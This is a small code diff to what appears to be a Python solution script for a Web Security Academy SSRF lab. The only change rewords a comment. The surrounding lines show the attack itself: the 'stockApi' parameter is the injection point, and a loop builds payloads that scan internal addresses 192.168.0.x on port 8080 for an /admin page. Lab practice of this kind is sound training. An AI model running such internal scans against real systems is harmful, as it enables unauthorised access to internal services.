@@ -27,7 +27,7 @@ url = "https://0a5700bf044cc0ce84d2b59a003e007a.web-security-academy.net"
 
 print(Fore.BLUE + "⟪#⟫ Injection point: " + Fore.YELLOW + "stockApi")
 
-# loop over all possible numbers
+# iterate over all possible numbers
 for x in range(0,255):
     # payload to scan the internal network
     payload = f"http://192.168.0.{x}:8080/admin"
